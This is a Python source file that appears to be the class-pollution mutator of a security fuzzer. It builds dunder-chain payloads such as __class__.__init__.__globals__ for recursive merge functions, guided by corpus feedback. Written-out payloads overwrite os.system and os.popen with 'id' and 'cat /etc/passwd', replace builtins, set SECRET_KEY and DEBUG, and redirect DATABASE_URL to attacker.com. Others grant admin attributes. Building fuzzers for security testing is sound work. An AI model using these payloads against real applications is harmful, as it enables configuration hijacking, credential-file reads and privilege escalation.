"""Class pollution taxonomy-driven mutator.

Targets Python class pollution (prototype pollution analog) via merge functions:
  CP1  Globals override       -> __class__.__init__.__globals__
  CP2  Class attr pollution   -> __class__.admin = True
  CP3  Bases/MRO traversal    -> __class__.__bases__[0], __mro__
  CP4  Dict injection         -> __dict__ direct manipulation
  CP5  Chain depth variation  -> vary nesting depth 1-6
  CP6  Value type juggling    -> True/"true"/1/"1"/null
  CP7  Dunder permutation     -> swap __init__/__new__/__call__, add evasion
  CP8  Path extension         -> extend deepest access path from corpus feedback
  CP9  Sink targeting         -> target unreached sinks via globals_reachable feedback
"""
from __future__ import annotations

import json
import random
from typing import TYPE_CHECKING, Any

from ..protocols import Input

if TYPE_CHECKING:
    from ..corpus import Seed

MAX_OUTPUT_SIZE = 8192

# ── Merge function targets ──────────────────────────────────────
MERGE_FUNCTIONS = [
    "recursive_merge",
    "recursive_merge_filtered",
    "setattr_loop",
    "dict_update_recursive",
]

# ── Dangerous globals to target ─────────────────────────────────
GLOBALS_TARGETS = [
    {"os": {"system": "id"}},
    {"os": {"environ": {"PATH": "/tmp/evil"}}},
    {"SECRET_KEY": "pwned"},
    {"DEBUG": True},
    {"__builtins__": {"eval": "REPLACED"}},
    {"subprocess": {"call": "REPLACED"}},
    {"sys": {"path": [".", "/tmp/evil"]}},
    {"config": {"SECRET_KEY": "pwned", "DEBUG": True}},
    {"os": {"popen": "cat /etc/passwd"}},
    {"__builtins__": {"__import__": "REPLACED"}},
    {"logging": {"config": {"handlers": "REPLACED"}}},
    {"ALLOWED_HOSTS": ["*"]},
    {"DATABASE_URL": "postgresql://evil:evil@attacker.com/db"},
]

# ── Class attributes to pollute ─────────────────────────────────
CLASS_ATTRS = [
    {"admin": True},
    {"is_admin": True},
    {"_is_superuser": True},
    {"role": "admin"},
    {"is_authenticated": True},
    {"debug": True},
    {"allowed": True},
    {"secret_key": "pwned"},
    {"permissions": ["admin", "write", "delete"]},
    {"level": 9999},
    {"admin": True, "role": "admin", "is_authenticated": True},
]

# ── Dunder attributes for chain building ────────────────────────
CHAIN_DUNDERS = [
    "__class__", "__init__", "__globals__", "__bases__",
    "__mro__", "__dict__", "__subclasses__",
]
INIT_VARIANTS = ["__init__", "__new__", "__call__"]
CLASS_VARIANTS = ["__class__"]

# ── Extension points for path_extension (CP8) ────────────────
PATH_EXTENSIONS = [
    "__class__", "__init__", "__globals__", "__bases__",
    "__mro__", "__dict__", "__subclasses__", "__new__",
    "__call__", "__reduce__", "__setattr__", "__getattr__",
    "__delattr__", "__slots__", "__module__", "__qualname__",
]

# ── Known dangerous sinks for sink_targeting (CP9) ───────────
ALL_SINKS = [
    "os", "subprocess", "sys", "pickle", "marshal", "ctypes", "importlib",
    "__builtins__.__import__", "__builtins__.eval", "__builtins__.exec",
    "__builtins__.compile", "SECRET_KEY", "DEBUG", "ALLOWED_HOSTS",
    "DATABASE_URL", "logging",
]

# Payloads to reach specific sinks via __globals__
SINK_PAYLOADS: dict[str, dict] = {
    "os": {"os": {"system": "id"}},
    "subprocess": {"subprocess": {"call": ["id"]}},
    "sys": {"sys": {"path": ["/tmp/evil"]}},
    "pickle": {"pickle": {"loads": "REPLACED"}},
    "marshal": {"marshal": {"loads": "REPLACED"}},
    "ctypes": {"ctypes": {"CDLL": "REPLACED"}},
    "importlib": {"importlib": {"import_module": "REPLACED"}},
    "__builtins__.__import__": {"__builtins__": {"__import__": "REPLACED"}},
    "__builtins__.eval": {"__builtins__": {"eval": "REPLACED"}},
    "__builtins__.exec": {"__builtins__": {"exec": "REPLACED"}},
    "__builtins__.compile": {"__builtins__": {"compile": "REPLACED"}},
    "SECRET_KEY": {"SECRET_KEY": "pwned"},
    "DEBUG": {"DEBUG": True},
    "ALLOWED_HOSTS": {"ALLOWED_HOSTS": ["*"]},
    "DATABASE_URL": {"DATABASE_URL": "postgresql://evil@attacker/db"},
    "logging": {"logging": {"config": {"handlers": "REPLACED"}}},
}

# ── Value type variations ───────────────────────────────────────
TRUE_VARIANTS: list[Any] = [True, "true", "True", "TRUE", 1, "1", "yes"]
FALSE_VARIANTS: list[Any] = [False, "false", "False", "FALSE", 0, "0", "no"]
NULL_VARIANTS: list[Any] = [None, "", 0, [], {}]


class ClassPollutionMutator:
    """Taxonomy-driven mutator for Python class pollution testing."""

    name = "class_pollution"

    def __init__(self, seed: int = 42):
        self._rng = random.Random(seed)
        self._strategies = [
            ("globals_override", self._cp1_globals_override, 20),
            ("class_attr_pollution", self._cp2_class_attr, 15),
            ("bases_traversal", self._cp3_bases_traversal, 10),
            ("dict_injection", self._cp4_dict_inject, 8),
            ("chain_depth_variation", self._cp5_chain_depth, 8),
            ("value_type_juggling", self._cp6_value_juggle, 8),
            ("dunder_permutation", self._cp7_dunder_permute, 8),
            ("combine", self._cp_combine, 5),
            ("path_extension", self._cp8_path_extension, 10),
            ("sink_targeting", self._cp9_sink_targeting, 8),
        ]
        self._weights = [w for _, _, w in self._strategies]
        self._hit_counts = [0] * len(self._strategies)

    def mutate(self, inp: Input, corpus: list[Seed]) -> Input:
        """Generate a class pollution payload."""
        # Try to parse existing input for context
        base_merge_fn = "recursive_merge"
        try:
            existing = json.loads(inp.data)
            if isinstance(existing, dict):
                base_merge_fn = existing.get("merge_fn", base_merge_fn)
        except (json.JSONDecodeError, UnicodeDecodeError):
            pass

        # Select strategy
        idx = self._rng.choices(range(len(self._strategies)), weights=self._weights, k=1)[0]
        name, strategy_fn, _ = self._strategies[idx]
        self._hit_counts[idx] += 1

        # CP8/CP9 need corpus context; fall back to CP1 if corpus empty
        if name in ("path_extension", "sink_targeting") and corpus:
            payload = strategy_fn(corpus)
        elif name in ("path_extension", "sink_targeting"):
            payload = self._cp1_globals_override()
        else:
            payload = strategy_fn()
        merge_fn = self._rng.choice(MERGE_FUNCTIONS) if self._rng.random() < 0.3 else base_merge_fn

        result = {"merge_fn": merge_fn, "payload": payload}
        data = json.dumps(result, ensure_ascii=False).encode("utf-8")

        if len(data) > MAX_OUTPUT_SIZE:
            data = data[:MAX_OUTPUT_SIZE]

        return Input(
            data=data,
            metadata={"source": f"class_pollution:{name}", "strategy": name},
        )

    def update_weights(self, findings_by_strategy: dict[str, int] | None = None) -> None:
        """Boost strategies that produce findings."""
        if not findings_by_strategy:
            return
        for i, (name, _, _) in enumerate(self._strategies):
            if name in findings_by_strategy:
                self._weights[i] = min(self._weights[i] * 1.5, 50)

    def reset_weights(self) -> None:
        self._weights = [w for _, _, w in self._strategies]

    # ── CP1: Globals override ───────────────────────────────────
    def _cp1_globals_override(self) -> dict:
        target = self._rng.choice(GLOBALS_TARGETS)
        chain = {"__class__": {"__init__": {"__globals__": dict(target)}}}
        return chain

    # ── CP2: Class attribute pollution ──────────────────────────
    def _cp2_class_attr(self) -> dict:
        attrs = dict(self._rng.choice(CLASS_ATTRS))
        return {"__class__": attrs}

    # ── CP3: Bases/MRO traversal ────────────────────────────────
    def _cp3_bases_traversal(self) -> dict:
        attrs = dict(self._rng.choice(CLASS_ATTRS))
        variant = self._rng.choice(["bases", "mro", "bases_globals", "mro_globals"])

        if variant == "bases":
            idx = str(self._rng.randint(0, 2))
            return {"__class__": {"__bases__": {idx: attrs}}}
        elif variant == "mro":
            idx = str(self._rng.randint(0, 3))
            return {"__class__": {"__mro__": {idx: attrs}}}
        elif variant == "bases_globals":
            target = self._rng.choice(GLOBALS_TARGETS)
            return {"__class__": {"__bases__": {"0": {"__init__": {"__globals__": dict(target)}}}}}
        else:  # mro_globals
            target = self._rng.choice(GLOBALS_TARGETS)
            return {"__class__": {"__mro__": {"1": {"__init__": {"__globals__": dict(target)}}}}}

    # ── CP4: Dict injection ─────────────────────────────────────
    def _cp4_dict_inject(self) -> dict:
        attrs = dict(self._rng.choice(CLASS_ATTRS))
        variant = self._rng.choice(["direct", "via_class", "vars"])

        if variant == "direct":
            return {"__dict__": attrs}
        elif variant == "via_class":
            return {"__class__": {"__dict__": attrs}}
        else:
            return {"__dict__": {"__class__": attrs}}

    # ── CP5: Chain depth variation ──────────────────────────────
    def _cp5_chain_depth(self) -> dict:
        depth = self._rng.randint(1, 6)
        terminal = self._rng.choice([
            dict(self._rng.choice(CLASS_ATTRS)),
            {"__globals__": dict(self._rng.choice(GLOBALS_TARGETS))},
        ])
        return self._build_chain(depth, terminal)

    def _build_chain(self, depth: int, terminal: dict) -> dict:
        """Build a dunder chain of given depth."""
        if depth <= 0:
            return terminal

        # Pick chain links
        chain_options = [
            lambda d, t: {"__class__": self._build_chain(d - 1, t)},
            lambda d, t: {"__class__": {"__init__": self._build_chain(d - 1, t)}},
            lambda d, t: {"__class__": {"__bases__": {"0": self._build_chain(d - 1, t)}}},
        ]
        builder = self._rng.choice(chain_options)
        return builder(depth, terminal)

    # ── CP6: Value type juggling ────────────────────────────────
    def _cp6_value_juggle(self) -> dict:
        attrs = dict(self._rng.choice(CLASS_ATTRS))
        juggled = {}
        for k, v in attrs.items():
            if v is True:
                juggled[k] = self._rng.choice(TRUE_VARIANTS)
            elif v is False:
                juggled[k] = self._rng.choice(FALSE_VARIANTS)
            elif v is None:
                juggled[k] = self._rng.choice(NULL_VARIANTS)
            elif isinstance(v, str):
                juggled[k] = self._rng.choice([v, v.upper(), v.lower(), 1, True])
            elif isinstance(v, int):
                juggled[k] = self._rng.choice([v, str(v), float(v)])
            else:
                juggled[k] = v
        return {"__class__": juggled}

    # ── CP7: Dunder permutation ─────────────────────────────────
    def _cp7_dunder_permute(self) -> dict:
        init_var = self._rng.choice(INIT_VARIANTS)
        target = self._rng.choice(GLOBALS_TARGETS)

        variant = self._rng.choice(["init_swap", "proto", "reduce", "setattr_override"])

        if variant == "init_swap":
            return {"__class__": {init_var: {"__globals__": dict(target)}}}
        elif variant == "proto":
            # JS-style __proto__ (shouldn't work in Python but tests edge cases)
            return {"__proto__": {"admin": True}}
        elif variant == "reduce":
            return {"__reduce__": ["os/system", ["id"]]}
        else:
            return {"__class__": {"__setattr__": None, "admin": True}}

    # ── Combined strategy ───────────────────────────────────────
    def _cp_combine(self) -> dict:
        """Combine multiple pollution vectors in one payload."""
        payload: dict[str, Any] = {}
        class_payload: dict[str, Any] = {}

        # Add class attr pollution
        class_payload.update(self._rng.choice(CLASS_ATTRS))

        # Add globals chain
        if self._rng.random() < 0.5:
            target = self._rng.choice(GLOBALS_TARGETS)
            class_payload["__init__"] = {"__globals__": dict(target)}

        payload["__class__"] = class_payload

        # Maybe also add direct dict injection
        if self._rng.random() < 0.3:
            payload["__dict__"] = dict(self._rng.choice(CLASS_ATTRS))

        return payload

    # ── CP8: Path extension (execution-guided) ───────────────
    def _cp8_path_extension(self, corpus: list[Seed]) -> dict:
        """Extend the deepest access path from a corpus seed with new dunder/attr.

        GHunter/Dasty-inspired: use execution feedback to grow the chain
        incrementally, reaching deeper into the object graph.
        """
        # Find a seed with access_path metadata (Seed.input.metadata)
        seeds_with_paths = [
            s for s in corpus
            if getattr(s, "input", None)
            and getattr(s.input, "metadata", None)
            and s.input.metadata.get("access_path")
            and len(s.input.metadata["access_path"]) > 0
        ]

        if not seeds_with_paths:
            # No execution feedback yet — generate a baseline chain
            return self._cp1_globals_override()

        seed = self._rng.choice(seeds_with_paths)
        path: list[str] = list(seed.input.metadata["access_path"])

        # Extension strategies
        variant = self._rng.choice([
            "append_dunder",    # add new dunder at end of path
            "branch_at_depth",  # fork at random depth, try different dunder
            "deepen",           # repeat last segment + add extension
            "widen",            # keep path, swap terminal payload
        ])

        if variant == "append_dunder":
            ext = self._rng.choice(PATH_EXTENSIONS)
            path.append(ext)
        elif variant == "branch_at_depth":
            if len(path) > 1:
                cut = self._rng.randint(1, len(path) - 1)
                path = path[:cut]
            path.append(self._rng.choice(PATH_EXTENSIONS))
        elif variant == "deepen":
            if path:
                path.append(path[-1])  # repeat last
            path.append(self._rng.choice(PATH_EXTENSIONS))
        else:  # widen — keep path, change terminal
            pass  # path stays the same, terminal changes below

        # Build nested dict from path
        terminal: dict[str, Any]
        if self._rng.random() < 0.5:
            terminal = dict(self._rng.choice(CLASS_ATTRS))
        else:
            terminal = dict(self._rng.choice(GLOBALS_TARGETS))

        return self._path_to_payload(path, terminal)

    def _path_to_payload(self, path: list[str], terminal: dict) -> dict:
        """Convert an access path list to a nested dict payload."""
        if not path:
            return terminal

        result = terminal
        for key in reversed(path):
            result = {key: result}
        return result

    # ── CP9: Sink targeting (execution-guided) ───────────────
    def _cp9_sink_targeting(self, corpus: list[Seed]) -> dict:
        """Target sinks not yet reached, using globals_reachable feedback.

        Dasty-inspired: prioritize payloads that reach new dangerous sinks
        not yet observed in the corpus.
        """
        # Collect all sinks already reached across corpus (Seed.input.metadata)
        reached_sinks: set[str] = set()
        for s in corpus:
            meta = getattr(getattr(s, "input", None), "metadata", None) or {}
            for sink in meta.get("globals_reachable", []):
                reached_sinks.add(sink)

        # Find unreached sinks
        unreached = [s for s in ALL_SINKS if s not in reached_sinks]

        if not unreached:
            # All sinks reached — try deeper chains to known sinks
            target_sink = self._rng.choice(ALL_SINKS)
        else:
            target_sink = self._rng.choice(unreached)

        # Build a payload targeting the specific sink
        sink_payload = SINK_PAYLOADS.get(target_sink)
        if sink_payload is None:
            sink_payload = {target_sink: "REPLACED"}

        # Vary the chain used to reach __globals__
        chain_variant = self._rng.choice([
            "standard",       # __class__.__init__.__globals__
            "via_new",        # __class__.__new__.__globals__
            "via_bases",      # __class__.__bases__[0].__init__.__globals__
            "via_mro",        # __class__.__mro__[1].__init__.__globals__
            "via_subclass",   # __class__.__subclasses__()[0].__init__.__globals__
            "double_class",   # __class__.__class__.__init__.__globals__
        ])

        globals_inner = {"__globals__": dict(sink_payload)}

        if chain_variant == "standard":
            return {"__class__": {"__init__": globals_inner}}
        elif chain_variant == "via_new":
            return {"__class__": {"__new__": globals_inner}}
        elif chain_variant == "via_bases":
            return {"__class__": {"__bases__": {"0": {"__init__": globals_inner}}}}
        elif chain_variant == "via_mro":
            idx = str(self._rng.randint(1, 3))
            return {"__class__": {"__mro__": {idx: {"__init__": globals_inner}}}}
        elif chain_variant == "via_subclass":
            return {"__class__": {"__subclasses__": {"0": {"__init__": globals_inner}}}}
        else:  # double_class
            return {"__class__": {"__class__": {"__init__": globals_inner}}}
